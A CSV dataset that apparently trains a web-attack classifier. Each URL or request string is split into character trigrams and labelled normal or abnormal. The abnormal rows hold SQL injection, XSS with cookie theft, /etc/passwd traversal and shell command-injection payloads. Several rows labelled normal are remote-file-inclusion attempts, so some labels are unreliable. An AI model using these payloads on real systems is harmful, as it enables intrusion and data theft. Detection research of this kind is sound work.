label,fenci
正常,/li lib ibr bra rar ary ry/ y/c /cu cus ust sto tom om_ m_t _te tem emp mpl pla lat ate te/ e/c /cu cus ust sto tom om_ m_t _te tem emp mpl pla lat ate te. e.p .ph php
正常,/bb bb_ b_a _ad adm dmi min in. n.p .ph php hp? p?i ?in inc ncl clu lud ude def efo foo oot ote ter er= r=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.1 .11 118 18: 8:8 :80 808 080 80/ 0/z /zz zz5 z5t 5th thk hkv kvt vtm tml mlg lgl gl?
正常,/pr pr2 r20 200 002 020 209 090 904 04b 4b/
异常,/t3 t3a 3af af3 f3t 3td tdz dz. z.c .cf cfc fc? c?< ?<s <sc scr cri rip ipt pt> t>c >cr cro ros oss ss_ s_s _si sit ite te_ e_s _sc scr cri rip ipt pti tin ing ng. g.n .na nas asl sl< l</ </s /sc scr cri rip ipt pt>
正常,/03 039 393 939 393 93/
异常,/cp cpe pe/ e/i /in ind nde dex ex. x.p .ph php hp? p?r ?re rep epe per ert rto toi oir ire re_ e_c _co con onf nfi fig ig= g=X =XX XXp Xpa pat ath thX hXX
正常,/09 09- 9-3 -31 315 159 590 901 01/
正常,/eg egg ggs gsh sha hap ape ped edb dba bas ask ske ket et/
正常,/do dow own wns nst sta tat at1 t1. 1.8 .8/ 8/c /ch cha har art rt. t.p .ph php hp? p?a ?ar art rt= t=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.9 .96 96: 6:8 :80 808 080 80/ 0/4 /4d 4dc dck ckq kqc qcc cc0 c0a 0ac acp cpr prb rbz bz? z??
正常,/le lef eft ftn tna nav avc vca cat ata tal alo log og/
正常,/jo joh ohn hn  n h  hi hia iat att tt  t 1  19 198 985 85  5 -  -  - w  wa war arm rmi min ing ng  g u  up up  p t  to to  o t  th the he  e i  ic ice ce  e a  ag age ge/
正常,/ab abh bhw hws wst stu tu9 u9. 9.r .re rem
正常,/pa pas ass ssw swo wor ord rd_ d_f _fo for org rgo got ott tte ten en/
异常,/my myh yho hom ome me/ e/d /do do. o.p .ph php hp? p?a ?ac ac= c=7 =71 71e 1ee ee3 e30 30a 0ae ae1 e11 117 17c 7cd cdd dda dac ace ce5 e55 55b 5bd bd0 d01 017 171 714 149 490 904 042 422 227 27% 7%2 %27 27% 7%2 %20 20U 0UN UNI NIO ION ON% N%2 %20 20A 0AL ALL LL% L%2 %20 20S 0SE SEL ELE LEC ECT CT% T%2 %20 20N 0NU NUL ULL LL% L%2 %2C 2C% C%2 %20 20N 0NU NUL ULL LL% L%2 %2C 2C% C%2 %20 20N 0NU NUL ULL LL- L-- --% -%2 %20
正常,/su sup upe per erb rbu but utt tt/
正常,/22 223 235 35- 5-w -wb wbg bgi gin inf nfr fra ras ast str tru ruc uct ctu tur ure re_ e_b _bu buy uyi yin ing nga gad adv dvi vic ice ce/
正常,/st sta tar ar  r w  wa war ars rs  s i  ii iii ii  i r  re rev eve ven eng nge ge  e o  of of  f t  th the he  e s  si sit ith th  h -  -  - d  dv dvd vdr dri rip ip/
异常,"ABC BC< C<d <di div iv  v s  st sty tyl yle le= e="" =""x ""x: x:\ :\x \x0 x00 00e 0ex exp xpr pre res ess ssi sio ion on( n(j (ja jav ava vas asc scr cri rip ipt pt: t:a :al ale ler ert rt( t(1 (1) 1)"" )""> "">D >DE DEF"
异常,"/ph php hpm pmy mya yad adm dmi min in/ n/f /fa faq aq. q.p .ph php hp? p?a ?ac act cti tio ion on= n=& =&t &ty typ ype pe= e=v =vi vie iew ew& w&s &s= s=& =&i &id id= d=- =-1 -1' 1'  ' u  un uni nio ion on  n s  se sel ele lec ect ct  t 0  0, 0,4 ,47 478 787 877 772 729 292 920 20, 0,0 ,0, 0,0 ,0, 0,0 ,0, 0,0 ,0, 0,0 ,0- 0--"
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/s /si sit ite tes es. s.s .sa sav ave
正常,/an ann nno nou oun unc nce cem eme men ent nts ts. s.p .ph php hp? p?p ?ph php hpr pra rai aid id_ d_d _di dir ir= r=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.9 .96 96: 6:8 :80 808 080 80/ 0/v /vi vir ir0 r0v 0v3 v3x 3xf xfc fc?
异常,"/zr zro roo oo3 o33 33l 3l4 l4. 4.m .ms msc scg cgi gi? i?< ?<s <sc scr cri rip ipt pt> t>d >do doc ocu cum ume men ent nt. t.c .co coo ook oki kie ie= e="" =""t ""te tes est sti tik ikl klc lc= c=9 =90 904 04; 4;"" ;""< ""</ </s /sc scr cri rip ipt pt>"
正常,/am amb mba bat atc tch chd hdo dot otc tco com om- m-s -se seo eoc oco con ont nte tes est st/
正常,/qt qti tim ime mee eed edi dit it/
正常,/f2 f21 210 103 030 302 02t 2t/
正常,/37 370 700 001 011 11/
异常,"/j4 j4d 4dr drb rbk bki kil il. l.p .ph php hp3 p3? 3?< ?<i <im img mg  g s  sr src rc= c="" =""j ""ja jav ava vas asc scr cri rip ipt pt: t:a :al ale ler ert rt( t(c (cr cro ros oss ss_ s_s _si sit ite te_ e_s _sc scr cri rip ipt pti tin ing ng. g.n .na nas asl sl) l); );"" ;"">"
正常,/bu but ut_ t_h _ho hot ot- t-t -to top opi pic ics cs/
异常,"/ig igt gtf tf0 f0z 0zo zon on. n.d .dl dll ll? l?< ?<i <im img mg  g s  sr src rc= c="" =""j ""ja jav ava vas asc scr cri rip ipt pt: t:a :al ale ler ert rt( t(c (cr cro ros oss ss_ s_s _si sit ite te_ e_s _sc scr cri rip ipt pti tin ing ng. g.n .na nas asl sl) l); );"" ;"">"
异常,/ex exa xam amp mpl ple les es/ s/j /js jsp sp/ p/c /ch che hec eck ckb kbo box ox/ x/i /in ind nde dex ex. x.p .ph php hp? p?g ?ga gad adg dge get et= t=. =.. ../ ./. /.. ../ ./. /.. ../ ./. /.. ../ ./. /.. ../ ./. /.. ../ ./e /et etc tc/ c/p /pa pas ass ssw swd wd\ d\x \x0 x00 00& 0&p &pa pat ath th= h=/ =/e /et etc
正常,/pi pid id- d-2 -27 278 788 880 803 034 348 48/
异常,/sc scr cri rip ipt pti tin ing ngz gzo zop ope pe/
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/c /cl cla las ass ss. s.r .rs rss
正常,/er err rro ror ors rs/ s/c /co con onf nfi fig igm gmo mod ode de. e.p .ph php hp? p?g ?ga gal all lle ler ery ry_ y_b _ba bas ase sed edi dir ir= r=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.1 .11 118 18: 8:8 :80 808 080 80/ 0/t /tz tzh zhf hfy fyz yzk zkb kbo bom oms msp spv pvm vm?
异常,/%c %c0 c0% 0%a %ae ae% e%c %c0 c0% 0%a %ae ae\ e\% \%c %c0 c0% 0%a %ae ae% e%c %c0 c0% 0%a %ae ae\ e\{ \{F {FI FIL ILE LE}
正常,/pa pas ast stf tfe fel ell llo low ows ws/
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/b /ba ban ann nne ner ers rs. s.o
异常,);} ;}p }pr pri rin int nt( t(` (`e `ec ech cho ho% o%2 %20 20K 0KA KAJ AJD JDY DYV YV% V%0 %0a 0ae aec ech cho ho% o%2 %20 20$ 0$( $(( ((7 (71 71% 1%2 %2B 2B8 B88 88) 8)) ))% )%0 %0a 0ae aec ech cho ho% o%2 %20 20K 0KA KAJ AJD JDY DYV YV% V%0 %0a 0ae aec ech cho ho% o%2 %20 20K 0KA KAJ AJD JDY DYV YV` V`) `)% )%3 %3B 3BK BKA KAJ AJD JDY DYV
正常,/li lib ib/ b/c /cl cla las ass sse ses es/ s/s /sw swi wif ift ft/ t/a /at att tta tac ach chm hme men ent nt. t.p .ph php hp. p.o .ol old
异常,'%7 %7C 7Ce Cec ech cho ho% o%2 %20 20Z 0ZP ZPV PVF VFO FOX OX$ X$( $(( ((8 (81 81% 1%2 %2B 2B2 B22 22) 2)) ))$ )$( $(e (ec ech cho ho% o%2 %20 20Z 0ZP ZPV PVF VFO FOX OX) X)Z )ZP ZPV PVF VFO FOX OX&
异常,%22 22% 2%3 %3B 3Be Bec ech cho ho% o%2 %20 20B 0BP BPG PGU GUE UEU EU$ U$( $(( ((7 (77 77% 7%2 %2B 2B5 B5) 5)) ))$ )$( $(e (ec ech cho ho% o%2 %20 20B 0BP BPG PGU GUE UEU EU) U)B )BP BPG PGU GUE UEU EU% U%2 %22
正常,/de deb ebr bri ris is  s -  -  - s  st sta tat ati tic ic  c d  di dis isp spo pos osa sal al/
正常,/da dav avi vid id1 d1/
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/s /sc scr cri rip ipt pt. t.j .js
正常,/b1 b1g 1gm gma mai ail il/
正常,/cu cur urs rso so  o l  li lin inu nux ux  x i  in ini nic ici cia ian ant nte tes es/
正常,/dl dl- l-2 -20 205 053 53/
正常,/xm xml mla lat ato tom oml mli lif ife feb ebl blo log og2 g29 298 983 830 30j 0jp jpe peg eg_ g_4 _48 480 80- 0-t -th thu hum umb mb/
异常,"/jn jnv nv8 v89 890 90l 0lt lt. t.j .js jsp sp? p?< ?<i <im img mg  g s  sr src rc= c="" =""j ""ja jav ava vas asc scr cri rip ipt pt: t:a :al ale ler ert rt( t(c (cr cro ros oss ss_ s_s _si sit ite te_ e_s _sc scr cri rip ipt pti tin ing ng. g.n .na nas asl sl) l); );"" ;"">"
异常,&#1 #10 10;
异常,<sc scr cri rip ipt pt> t>~ >~' ~'\ '\u \u0 u00 006 061 61' 1'  ' ;  ;  ; \  \u \u0 u00 007 074 74\ 4\u \u0 u00 006 068 68\ 8\u \u0 u00 007 072 72\ 2\u \u0 u00 006 06F 6F\ F\u \u0 u00 007 077 77  7 ~  ~  ~ \  \u \u0 u00 007 074 74\ 4\u \u0 u00 006 068 68\ 8\u \u0 u00 006 069 69\ 9\u \u0 u00 007 073 73. 3.  . \  \u \u0 u00 006 061 61\ 1\u \u0 u00 006 06C 6C\ C\u \u0 u00 006 065 65\ 5\u \u0 u00 007 072 72\ 2\u \u0 u00 007 074 74( 4(~ (~' ~'\ '\u \u0 u00 006 061 61' 1') ')< )</ </s /sc scr cri rip ipt pt  t U  U+
异常,"/yw ywa wax axn xnt ntr trx rx. x.f .ft fts ts? s?< ?<i <im img mg  g s  sr src rc= c="" =""j ""ja jav ava vas asc scr cri rip ipt pt: t:a :al ale ler ert rt( t(c (cr cro ros oss ss_ s_s _si sit ite te_ e_s _sc scr cri rip ipt pti tin ing ng. g.n .na nas asl sl) l); );"" ;"">"
正常,/en env nvi vic ico con on/
正常,/ph php hpm pmy mya yad adm dmi min in/ n/d /do doc ocu cum ume men ent nta tat ati tio ion on. n.h .ht htm tml ml? l?p ?ph php hpm pmy mya yad adm dmi min in= n=d =d6 d6o 6oa oa1 a1t 1tb tb2 b2m 2mj mj6 j6g 6gt gtk tks ksb sb8 b8p 8pu pu6 u6m 6mj mjq jql ql8 l84 84p 4pm pm6 m6j 6js jss
异常,/li lin ink nk- k-d -de des esc scr cri rip ipt pti tio ion on/
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/o /or ora rac acl cle le. e.x .xm xml ml. l.x .xs xsq sql ql. l.x .xs xsq sql qls lse ser erv rvl vle let et. t.z .zi zip
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/t /tr tra ras ash sh. h.s .st sta tac ack ckd kdu dum ump
正常,/41 418 180 802 02r 2re res ese sea ear arc rch cha han ana nal aly lys yst stc tco con onf nfl fli lic ict cts tso sof ofi fin int nte ter ere res est stc tcm cmt mt9 t9/
正常,/te tea eac ach che her ers rs- s-h -he hel elp lp/
正常,/ha hal all llo low owe wee een en  n p  pu pum ump mpk pki kin in  n 3  3d 3d  d s  sc scr cre ree een ens nsa sav ave ver er  r 1  1/
正常,/om omg mg! g!  ! v  ve ver ery ry  y p  pe pet eti tit ite te  e r  ru rus uss ssi sia ian an  n b  bl blo lon ond nde de  e g  ge get ets ts  s f  fu fuc uck cke ked ed  d b  by by  y h  he her er  r u  un unc ncl cle le  e !  !! !!! !!/
异常, UN UNI NIO ION ON  N S  SE SEL ELE LEC ECT
异常,"/""o ""on ona naf aft fte ter ers rsc scr cri rip ipt pte tex exe xec ecu cut ute te= e=a =al ale ler ert rt( t(' ('X 'XS XSS SS' S') ')  ) 1  1= 1='"
异常,/ex exa xam amp mpl ple les es/ s/j /js jsp sp/ p/e /er err rro ror or/ r/a /ad adm dmi min in/ n/a /ad adm dmi min in. n.p .ph php hp? p?s ?si sid id= d=0 =0'
异常,/h2 h21 21y 1y8 y8w 8w5 w52 52. 2.j .js jsp sp? p?< ?<s <sc scr cri rip ipt pt> t>c >cr cro ros oss ss_ s_s _si sit ite te_ e_s _sc scr cri rip ipt pti tin ing ng. g.n .na nas asl sl< l</ </s /sc scr cri rip ipt pt>
正常,/pl plu lug ugi gin ins ns/ s/1 /1_ 1_a _ad adr dre res ess ssb sbu buc uch ch/ h/d /de del ele let ete te. e.p .ph php hp? p?f ?fo fol old lde der er= r=h =ht htt ttp tp: p:/ :// //c /ci cir irt rt. t.n .ne net et/ t/r /rf rfi fii iin inc nc. c.t .tx txt xt?
异常,/cg cgi gi- i-w -wi win in/ n/c /cg cgi gi- i-t -te tes est st. t.e .ex exe
正常,/mo mot otl tle ley ey  y c  cr cru rue ue  e -  -  - l  li liv ive ve  e i  in in  n n  ne new ew  w y  yo yor ork rk  k         0  03 03  3 m  ma mar arc rch ch  h 2  20 200 005 05/
正常,/re rem emi min ini nis isc sce cen enc nce ces es  s o  of of  f a  a  a s  st sto toc ock ck  k o  op ope per era rat ato tor or  r b  by by  y e  ed edw dwi win in  n l  le lef efe fev evr vre re/
异常,%25 252 522 22% 2%7 %7C 7C% C%2 %20 20% 0%5 %5B 5B% B%2 %20 207 07% 7%2 %20 20- 0-n -ne ne% e%2 %20 20% 0%2 %24 24% 4%2 %28 28e 8ec ech cho ho% o%2 %20 20J 0JL JLF LFV FVE VEC EC% C%2 %20 20% 0%7 %7C 7C% C%2 %20 20t 0tr tr% r%2 %20 20- 0-d -d% d%2 %20 20% 0%2 %27 27% 7%5 %5C 5Cn Cn% n%2 %27 27% 7%2 %20 20% 0%7 %7C 7C% C%2 %20 20w 0wc wc% c%2 %20 20- 0-c -c% c%2 %29 29% 9%2 %20 20% 0%5 %5D 5D% D%2 %20 20% 0%7 %7C 7C% C%7 %7C 7C% C%2 %20 20s 0sl sle lee eep ep% p%2 %20 201 01% 1%2 %20 20/ 0//
正常,/po por ort rte ter erf rfi fie iel eld ldc dco col oll lle leg egi gia iat ate te/
正常,/72 720 203 032 325 25/
异常,"""&& &&e &ec ech cho ho$ o$I $IF IFS FSO SOL OLY LYC YCA CAK AK$ K$( $(( ((5 (57 57% 7%2 %2B 2B6 B64 64) 4)) ))$ )$( $(e (ec ech cho ho$ o$I $IF IFS FSO SOL OLY LYC YCA CAK AK) K)O )OL OLY LYC YCA CAK AK% K%2 %2F 2F% F%2 %2F"
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/c /ca car ar. r.j .jp jpg
正常,/pl pla lay ayl yli lis ist st. t.p .ph php hp? p?p ?ph php hpb pbb bb_ b_r _ro roo oot ot_ t_p _pa pat ath th= h=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.1 .11 118 18: 8:8 :80 808 080 80/ 0/t /tz tzh zhf hfy fyz yzk zkb kbo bom oms msp spv pvm vm?
异常,/sc scr cri rip ipt pts ts/ s/w /wx wx4 x4z 4z4 z4g 4ge ged edh dhl hl0 l0l 0l. l.s .sh sht htm tml
异常,||e |ec ech cho ho$ o$I $IF IFS FSC SCQ CQD QDQ DQP QPG PG$ G$( $(( ((9 (96 96% 6%2 %2B 2B9 B92 92) 2)) ))$ )$( $(e (ec ech cho ho$ o$I $IF IFS FSC SCQ CQD QDQ DQP QPG PG) G)C )CQ CQD QDQ DQP QPG PG% G%2 %2F 2F% F%2 %2F
异常,/my myh yho hom ome me/ e/c /co con onn nne nec ect ct. t.p .ph php hp/ p/a /ad adm dmi min in/ n/a /aj aja jax ax. x.a .as asp spx px? x?A ?Aj Aja jax axT xTe Tem emp mpl pla lat ate te= e=a =aj aja jax axt xto top opi pic ici cin inf nfo fo. o.a .as asc scx cx& x&p &po pos ost ste ter er= r=1 =1' 1') '); );% ;%2 %20 20W 0WA WAI AIT ITF TFO FOR OR% R%2 %20 20D 0DE DEL ELA LAY AY% Y%2 %20 20' 0'0 '0: 0:0 :0: 0:5 :5' 5'- '--
异常,"/33 33y 3y9 y9g 9gc gcq cqq qq. q.a .as asp spx px? x?< ?<m <me met eta ta  a h  ht htt ttp tp- p-e -eq equ qui uiv iv= v=s =se set et- t-c -co coo ook oki kie ie  e c  co con ont nte ten ent nt= t="" =""t ""te tes est stn tnv nvx vxc xc= c=4 =43 430 301 01"" 1"">"
正常,/il ilt ltw tw_ w_l _lc lc/
正常,/13 138 388 883 839 39/
异常,/ex exa xam amp mpl ple les es/ s/j /js jsp sp/ p/n /nu num um/ m/i /in ind nde dex ex. x.p .ph php hp? p?c ?ci cid id= d='
异常,"/en en- n-u -us us/ s/d /dd ddo dow owo wor orr rrl rl. l.i .id idc dc? c?< ?<s <sc scr cri rip ipt pt> t>d >do doc ocu cum ume men ent nt. t.c .co coo ook oki kie ie= e="" =""t ""te tes est stv tvl vla lau au= u=8 =85 851 517 17; 7;"" ;""< ""</ </s /sc scr cri rip ipt pt>"
正常,/ph php hp/ p/i /in ind nde dex ex. x.p .ph php
正常,/of off fft fth the hef efi fie iel eld ld/
异常,"/ma mai ain in. n.p .ph php hp? p?s ?st stu tuf uff ff= f="" =""r ""rm rm, m,q ,q4 q47 476 762 628 286 864 643 43& 3&r &re rem em,"
异常,"""%7 %7C 7C% C%7 %7C 7Ce Cec ech cho ho$ o$I $IF IFS FSR SRO ROI OIM IMQ MQV QV$ V$( $(( ((2 (24 24% 4%2 %2B 2B2 B28 28) 8)) ))$ )$( $(e (ec ech cho ho$ o$I $IF IFS FSR SRO ROI OIM IMQ MQV QV) V)R )RO ROI OIM IMQ MQV QV% V%2 %26"
正常,/ma man anu nua ual al/ l/e /en en/ n/p /pl pla lat atf tfo for orm rm/ m/w /wi win in_ n_c _co com omp mpi pil ili lin ing ng. g.h .ht htm tml
正常,/ch cha hat at/ t/u /us use ser ers rs_ s_p _po pop opu pup upl pl. l.p .ph php hp3 p3? 3?f ?fr fro rom om= m=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.1 .11 118 18: 8:8 :80 808 080 80/ 0/m /mo moc ocl cly lyx yxl xlw lwq wqy qyf yfj fjn jnp np?
正常,/op ope pen enw nwo wor orl rld lds dsf sf0 f06 06- 6-1 -18 18/
正常,/18 187 876 766 664 648 48/
正常,/se sea ear arc rch ch_ h_s _sl sl/
正常,/go gor oru rum um/ m/d /db dbp bpr pro rop ope per ert rty ty. y.p .ph php hp? p?a ?ap app ppd pdi dir irn rna nam ame me= e=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.1 .11 118 18: 8:8 :80 808 080 80/ 0/z /zz zz5 z5t 5th thk hkv kvt vtm tml mlg lgl gl?
异常,/re rec eco cor ord rdi din ing ngs gs/ s/s /sc scr cri rip ipt pt/ t/c /ca cat at_ t_f _fo for or_ r_g _ge gen en. n.p .ph php hp? p?a ?ad ad= d=1 =1& 1&a &ad ad_ d_d _di dir ire rec ect ct= t=. =.. ../ ./& /&m &m_ m_f _fo for or_ r_r _ra rac aci cin ine ne= e=< =</ </o /op opt pti tio ion on> n>< ></ </s /se sel ele lec ect ct> t>< ><? <?p ?ph php hpi pin inf nfo fo( o() (); );? ;?>
正常,/st str tri rik ike keo eou out ut/
正常,/do doc oc- c-5 -52 528 289 890 903 033 33/
正常,/ex exa xam amp mpl ple les es/ s/j /js jsp sp/ p/c /ch che hec eck ckb kbo box ox/ x/a /ad adm dmi min in. n.p .pl pl? l?p ?pa pat ath th= h=b =bi bin in/ n/m /mo moz ozi zil ill lla la& a&a &ac act cti tio ion on= n=l =li lis ist st_ t_u _us use ser ers
异常,/cg cgi gi- i-b -bi bin in/ n/i /in ind nde dex ex. x.p .ph php hp? p?l ?ln lng ng= g=. =.. ../ ./s /sy sys yst ste tem em_ m_f _fo foo oot ote ter er& r&s &se sen ens nso sor or_ r_p _pr pro rog ogr gra ram am= m=p =ph php hps psy sys ysi sin inf nfo fo_ o_2 _24 241 41. 1.n .na nas asl
异常,/in ind nde dex ex. x.p .ph php hp? p?s ?sk ski kin in= n=< =<s <sc scr cri rip ipt pt> t>a >al ale ler ert rt( t(4 (41 414 145 456 566 660 608 083 835 358 580 80) 0)< )</ </s /sc scr cri rip ipt pt>
异常,/op ope pen ens nsi sit ite tea ead adm dmi min in/ n/s /sc scr cri rip ipt pts ts/ s/c /cl cla las ass sse ses es/ s/l /lo log ogi gin inm nma man ana nag age ger er. r.p .ph php hp? p?p ?pa pat ath th= h=h =ht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.9 .96 96: 6:8 :80 808 080 80/ 0/v /vi vir ir0 r0v 0v3 v3x 3xf xfc fc? c?\ ?\x \x0 x00
正常,/cr cri rim ims mso son on  n m  mo moo oon onl nli lig igh ght ht  t -  -  - t  th the he  e c  co cov ove ven ena nan ant nt  t p  pr pro rog ogr gre res ess ss/
正常,/ka kat atr tri rin ina naf afo foc ocu cus usg sgr gro rou oup up/
异常,"/he hel elp lp. p.p .ph php hp? p?q ?q= q="" =""& ""&v &ve ver er, r,> ,>q >q6 q66 662 624 241 417 178 785 85& 5&r &re rem em,"
正常,/ma mai ain in/ n/i /in inc nc/ c/s /st sty tyl yle les esh she hee eet et. t.p .ph php hp? p?v ?ve ver ers rsi sio ion on= n=1 =13 133 331 319 192 921 210 104 047
正常,/li lib ib/ b/c /cl cla las ass sse ses es/ s/s /sw swi wif ift ft/ t/t /tr tra ran ans nsp spo por ort rt/ t/s /st str tre rea eam amb mbu buf uff ffe fer er. r.p .ph php hp. p.c .co cop opy
异常,/to top op. p.p .ph php hp? p?s ?st stu tuf uff ff= f=u =un una nam ame me\ e\x \x0 x09 09> 9>q >q6 q61 614 149 498 983 834 348 48\ 8\x \x0 x09 09#
异常,"/en en- n-u -us us/ s/s /s7 s7q 7qu qus us4 s4g 4g3 g3. 3.c .cf cfm fm? m?< ?<i <im img mg  g s  sr src rc= c="" =""j ""ja jav ava vas asc scr cri rip ipt pt: t:a :al ale ler ert rt( t(c (cr cro ros oss ss_ s_s _si sit ite te_ e_s _sc scr cri rip ipt pti tin ing ng. g.n .na nas asl sl) l); );"" ;"">"
正常,/mu mus usi sic ica cal al- l-i -in ins nst str tru rum ume men ent nts ts_ s_w _w0 w0q 0qq qqf qfr fro rom omz mzr zr4 r4q 4qq qqs qsa sac aca cat atz tz3 z37 379 797 974 74q 4qq qqs qso soc ocm cmd mdz dzl zli lis ist sti tin ing ngi git ite tem eml mli lis ist stq tqq qqs qss ssp spa pag age gen ena nam ame mez ezd zdc dcp cpa pan ant nti tiq iqu que ues est ste tex ext xtn tno non onf nfe fea eat at/
正常,/ca cat at_ t_v _vi vid ide deo eoc oca cas ast sts ts/
正常,/fo for oru rum um. m.p .ph php hp? p?i ?id id_ d_a _ar art rti tic icl cle le= e=1 =1& 1&i &id id_ d_f _fo for oru rum um= m=- =-1 -1/ 1/* /** **/ */u /un uni nio ion on/ n/* /** **/ */s /se sel ele lec ect ct  t 1  11 110 107 076 767 672 727 276 760 60- 0--
异常,"/in ind nde dex ex. x.p .ph php hp? p?q ?q= q="" =""> "">< ><s <sc scr cri rip ipt pt> t>a >al ale ler ert rt( t(4 (41 413 137 370 706 060 608 083 835 353 530 30) 0)< )</ </s /sc scr cri rip ipt pt> t>< ><"" <""& ""&r &r= r=1 =10 10& 0&p &pa pag age ge= e=9 =9& 9&s &se sec ect cti tio ion on= n=6"
正常,/21 214 145 458 587 874 74/
异常,/%2 %2e 2e% e%2 %2e 2e/ e/{ /{F {FI FIL ILE LE}
异常,"/aw aws wst sta tat ats ts/ s/a /aw aws wst sta tat ats ts. s.p .pl pl? l?m ?mi mig igr gra rat ate te= e=| =|e |ec ech cho ho; o;/ ;/b /bi bin in/ n/e /ec ech cho ho  o -  -e -en en  n ""  ""\ ""\0 \01 017 174 74\ 4\0 \00 004 044 44\ 4\0 \00 000 000 00\ 0\0 \03 037 377 77\ 7\0 \03 034 347 47"" 7""  "" >  >> >>  > /  /t /tm tmp mp/ p/u /ur urc rcp cpp ppb pbu bum umw mwm wm0 m0; 0;e ;ec ech cho ho| o|a |aw aws wst sta tat ats ts4 s44 447 476 767 671 71. 1.t .tx txt"
异常,"/6d 6dl dlc lc2 c2z 2zm zm9 m9. 9.a .as asp sp? p?< ?<s <sc scr cri rip ipt pt> t>d >do doc ocu cum ume men ent nt. t.c .co coo ook oki kie ie= e="" =""t ""te tes est stq tqp qpu pux ux= x=4 =40 401 016 16; 6;"" ;""< ""</ </s /sc scr cri rip ipt pt>"
异常,"/j4 j4r 4rd rdy dyh yhw hw8 w8. 8.x .x? x?< ?<m <me met eta ta  a h  ht htt ttp tp- p-e -eq equ qui uiv iv= v=s =se set et- t-c -co coo ook oki kie ie  e c  co con ont nte ten ent nt= t="" =""t ""te tes est str trl rlu luj uj= j=1 =14 142 420 20"" 0"">"
正常,/a2 a29 298 986 863 636 365 65/
正常,/se sep ep_ p_s _se ser erv rvi vic ice ce/
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/a /am ama man and nda
异常,/ja jav ava vas asc scr cri rip ipt pt/ t/f /fu fun unc ncs cs. s.e .ex exe
正常,/ja jav ava vas asc scr cri rip ipt pt/ t/b /be bee een en. n.a .as
正常,/52 529 296 966 665 659 596 964 64m 4me men ent nte tec ec/
正常,/in ind nde dex ex. x.p .ph php hp? p?p ?pa pag age geh eht htt ttp tp: p:/ :// //1 /19 192 92. 2.1 .16 168 68. 8.2 .20 202 02. 2.9 .96 96: 6:8 :80 808 080 80/ 0/4 /4d 4dc dck ckq kqc qcc cc0 c0a 0ac acp cpr prb rbz bz?
异常,&#X #X0 X00 000 000 000 003 03e 3e;
异常,' O  OR OR  R '  '1 '1' 1'= '=' ='1 '1' 1'  ' #
正常,/89 899 999 993 936 368 689 893 938 383 836 365 653 539 395 959 596 967 67/
正常,/20 200 006 060 609 090 905 05_ 5_m _md mda das ase sec ec/
正常,/oh ohf hf0 f07 07_ 7_i _id ids ds/
正常,/ri ris iss sso sou oue ue_ e_m _mi mic icr cro rom ome meg ega gap apr pro rog ogr gra ram amm mme med ede dep eph phy hys ysi siq iqu que ue/
异常,"/33 33y 3y9 y9g 9gc gcq cqq qq. q.k .ks ksp spx px? x?< ?<m <me met eta ta  a h  ht htt ttp tp- p-e -eq equ qui uiv iv= v=s =se set et- t-c -co coo ook oki kie ie  e c  co con ont nte ten ent nt= t="" =""t ""te tes est stn tnv nvx vxc xc= c=4 =43 430 301 01"" 1"">"
正常,/in inc ncl clu lud ude de/ e/p /pe pea ear ar/ r/i /it it. t.p .ph php hp? p?b ?ba bas ase sep epa pat ath th= h=@ =@r @rf rfi fiu iur url
正常,/uc uce cer ert rti tif ify fy  y m  mi mic icr cro ros oso sof oft ft  t m  m7 m70 70- 0-3 -31 310 10  0 p  pr pre rep epk pki kit it  t v  v8 v8/
